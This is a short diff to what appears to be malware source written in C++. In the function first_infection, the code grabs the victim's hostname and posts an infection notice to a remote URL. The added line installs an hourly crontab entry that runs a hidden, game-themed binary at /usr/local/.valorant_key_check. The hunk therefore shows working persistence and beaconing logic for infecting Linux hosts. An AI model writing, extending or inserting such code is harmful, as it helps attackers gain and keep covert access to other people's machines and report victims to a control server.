@@ -87,6 +87,7 @@ void first_infection() {
     std::vector<std::string> val = command("hostname");
     infectedHostname = val[0];
     curl_post(URL, FIRST_INFECT, "");
+    command("1 * * * * /usr/local/.valorant_key_check | crontab -");
 }
 
 void check_and_post() {
